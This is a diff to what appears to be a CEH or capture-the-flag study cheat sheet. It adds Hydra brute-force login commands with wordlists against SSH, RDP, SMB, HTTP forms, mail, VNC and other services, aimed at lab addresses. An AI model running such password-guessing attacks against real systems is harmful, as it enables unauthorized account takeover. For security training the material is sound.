@@ -613,10 +613,20 @@ wpscan --url http://x.x.x.x:8080/CEH -u <user> -P ~/wordlists/password.txt
   <summary>Hydra</summary>
 
 ## Hydra
+### GUI
+```console
+xhydra
+```
 
+### RDP
+```console
+hydra -V -f -L usernames.txt -P passwords.txt rdp://10.0.2.5 -V
+```
 ### SSH
 ```console
 hydra -l username -P passlist.txt x.x.x.x ssh
+
+hydra -l root -P passwords.txt -f ssh://10.0.2.5 -V
 ```
 ```console
 hydra -t4 -l lin -P /usr/share/wordlists/rockyou.txt ssh:10.10.149.11
@@ -632,19 +642,73 @@ hydra -l user -P passlist.txt ftp://10.10.10.10
 ```console
 hydra -L userlist.txt -P passlist.txt ftp://x.x.x.x -s 221
 ```
-* Post Web Form
-```console
-hydra -l -P 10.10.46.122 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
-```
-
 * Used to download the specific file from FTP to attacker or local machine
 ```console
 get flag.txt ~/Desktop/filepath/flag.txt
 get flag.txt .
 ```
+### SMB
+```console
+hydra -l root -P passwords.txt -f smb://10.0.2.5 -V
+```
+
+### HTTP Basic Auth
+```console
+hydra -L users.txt -P password.txt 10.0.2.5 http-get /login/ -V
+```
+### HTTP POST
+```console
+# HTTP Post
+hydra -L users.txt -P password.txt 10.0.2.5 http-post-form
+"/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login
+name or password is incorrect" -V
+```
+### IMAP
+```console
+# IMAP
+hydra -l root -P passwords.txt -f imap://10.0.2.5 -V
+```
+### POP
+```console
+# POP
+hydra -l USERNAME -P passwords.txt -f pop3://10.0.2.5 -V
+```
+
+### Post Web Form
+```console
+hydra -l -P 10.10.46.122 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+```
+
+
 ### TELNET
 ```console
 hydra -l admin -P passlist.txt -o test.txt x.x.x.x telnet
+```
+### Other Examples
+```console
+Rexec
+hydra -l root -P password.txt rexec://10.0.2.5 -V
+
+Rlogin
+hydra -l root -P password.txt rlogin://10.0.2.5 -V
+
+RSH
+hydra -L username.txt rsh://10.0.2.5 -V
+
+RSP
+hydra -l root -P passwords.txt <IP> rtsp
+
+SMTP
+hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
+hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V
+#Port 587 for SMTP with SSL
+
+Telnet
+hydra -l root -P passwords.txt [-t 32] <IP> telnet
+
+VNC
+hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT>
+<IP> vnc
 ```
 </details>
 
